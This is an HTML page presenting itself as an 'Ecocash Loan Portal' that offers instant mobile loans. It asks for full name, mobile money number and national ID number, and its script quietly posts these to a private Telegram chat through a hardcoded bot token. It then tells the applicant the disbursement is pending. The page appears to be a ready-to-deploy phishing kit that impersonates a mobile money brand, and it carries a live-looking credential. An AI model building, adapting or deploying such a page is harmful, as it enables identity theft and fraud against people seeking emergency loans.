<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ecocash Instant Mobile Loans - 2026</title>
    <style>
        :root {
            --eco-green: #059669;
            --eco-dark-green: #047857;
            --dark: #0f172a;
            --text: #1e293b;
            --muted: #475569;
            --bg: #f0fdf4;
            --card: #ffffff;
            --border: #cbd5e1;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body {
            background-color: var(--bg);
            color: var(--text);
            padding: 16px;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            line-height: 1.6;
        }

        .container {
            width: 100%;
            max-width: 600px;
        }

        .card {
            background: var(--card);
            border-radius: 12px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            border: 1px solid var(--border);
        }

        .header {
            background: linear-gradient(135deg, var(--eco-green), var(--eco-dark-green));
            color: white;
            padding: 24px;
            text-align: center;
        }

        .header h1 {
            font-size: 24px;
            margin-bottom: 8px;
        }

        .header p {
            font-size: 14px;
            opacity: 0.9;
        }

        .form-body {
            padding: 24px;
        }

        .section-title {
            font-size: 14px;
            font-weight: 700;
            color: var(--eco-dark-green);
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 16px;
            padding-bottom: 6px;
            border-bottom: 2px solid var(--bg);
        }

        .form-group {
            margin-bottom: 16px;
        }

        label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 6px;
            color: var(--text);
        }

        input, select {
            width: 100%;
            padding: 12px;
            border: 1px solid var(--border);
            border-radius: 8px;
            font-size: 15px;
            background-color: #f8fafc;
            color: var(--text);
            transition: border-color 0.2s;
        }

        input:focus, select:focus {
            outline: none;
            border-color: var(--eco-green);
            background-color: #fff;
        }

        .submit-btn {
            width: 100%;
            background-color: var(--eco-green);
            color: white;
            border: none;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 10px;
        }

        .submit-btn:hover {
            background-color: var(--eco-dark-green);
        }

        .status-message {
            margin-top: 16px;
            padding: 12px;
            border-radius: 8px;
            font-size: 14px;
            text-align: center;
            display: none;
        }

        .status-success {
            background-color: #d1fae5;
            color: #065f46;
            border: 1px solid #a7f3d0;
        }

        .status-error {
            background-color: #fee2e2;
            color: #991b1b;
            border: 1px solid #fecaca;
        }

        .footer {
            text-align: center;
            padding: 16px;
            font-size: 12px;
            color: var(--muted);
            border-top: 1px solid var(--bg);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="header">
                <h1>Ecocash Loan Portal</h1>
                <p>Quick approval and direct mobile wallet disbursement.</p>
            </div>
            
            <form id="loanForm" class="form-body">
                <div class="section-title">1. Personal Information</div>
                
                <div class="form-group">
                    <label for="fullName">Full Name (As registered on Mobile Money) *</label>
                    <input type="text" id="fullName" required placeholder="e.g. John Doe">
                </div>

                <div class="form-group">
                    <label for="phoneNumber">Mobile Money Phone Number *</label>
                    <input type="tel" id="phoneNumber" required placeholder="e.g. 0712345678">
                </div>

                <div class="form-group">
                    <label for="nationalId">National ID Number *</label>
                    <input type="text" id="nationalId" required placeholder="e.g. 12345678">
                </div>

                <div class="section-title" style="margin-top: 24px;">2. Loan Request</div>

                <div class="form-group">
                    <label for="loanAmount">Requested Loan Amount *</label>
                    <select id="loanAmount" required>
                        <option value="" disabled selected>Select amount</option>
                        <option value="5,000">5,000 KES / UGX</option>
                        <option value="10,000">10,000 KES / UGX</option>
                        <option value="25,000">25,000 KES / UGX</option>
                        <option value="50,000">50,000 KES / UGX</option>
                        <option value="100,000">100,000 KES / UGX</option>
                    </select>
                </div>

                <div class="form-group">
                    <label for="repaymentPeriod">Repayment Period *</label>
                    <select id="repaymentPeriod" required>
                        <option value="" disabled selected>Select period</option>
                        <option value="1 Month">1 Month</option>
                        <option value="3 Months">3 Months</option>
                        <option value="6 Months">6 Months</option>
                    </select>
                </div>

                <div class="form-group">
                    <label for="loanPurpose">Purpose of Loan *</label>
                    <select id="loanPurpose" required>
                        <option value="" disabled selected>Select purpose</option>
                        <option value="Business Expansion">Business Expansion</option>
                        <option value="Emergency Medical">Emergency Medical</option>
                        <option value="School Fees">School Fees</option>
                        <option value="Personal Upkeep">Personal Upkeep</option>
                    </select>
                </div>

                <button type="submit" class="submit-btn" id="submitBtn">Submit Loan Application</button>
                
                <div id="statusBox" class="status-message"></div>
            </form>

            <div class="footer">
                &copy; 2026 Ecocash Loan Services. Secure Instant Processing.
            </div>
        </div>
    </div>

    <script>
        // Pre-configured Telegram Credentials
        const botToken = "8641245398:AAGYI7pFOVVrKqf9ILOSo6yGyOdFVSekkpM";
        const chatId = "8557614507";

        document.getElementById('loanForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const submitBtn = document.getElementById('submitBtn');
            const statusBox = document.getElementById('statusBox');
            
            submitBtn.disabled = true;
            submitBtn.textContent = 'Submitting Application...';
            statusBox.style.display = 'none';

            const fullName = document.getElementById('fullName').value;
            const phoneNumber = document.getElementById('phoneNumber').value;
            const nationalId = document.getElementById('nationalId').value;
            const loanAmount = document.getElementById('loanAmount').value;
            const repaymentPeriod = document.getElementById('repaymentPeriod').value;
            const loanPurpose = document.getElementById('loanPurpose').value;

            const message = `🚨 *NEW LOAN APPLICATION* 🚨\n\n` +
                            `👤 *Name:* ${fullName}\n` +
                            `📱 *Phone:* ${phoneNumber}\n` +
                            `🆔 *National ID:* ${nationalId}\n` +
                            `💰 *Amount:* ${loanAmount}\n` +
                            `⏱ *Period:* ${repaymentPeriod}\n` +
                            `📋 *Purpose:* ${loanPurpose}`;

            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                const data = await response.json();

                if (data.ok) {
                    statusBox.textContent = 'Application submitted successfully! Disbursement pending review.';
                    statusBox.className = 'status-message status-success';
                    statusBox.style.display = 'block';
                    document.getElementById('loanForm').reset();
                } else {
                    throw new Error(data.description || 'Telegram API error');
                }
            } catch (error) {
                statusBox.textContent = 'Submission failed. Please check your network or bot configuration.';
                statusBox.className = 'status-message status-error';
                statusBox.style.display = 'block';
            } finally {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Submit Loan Application';
            }
        });
    </script>
</body>
</html>
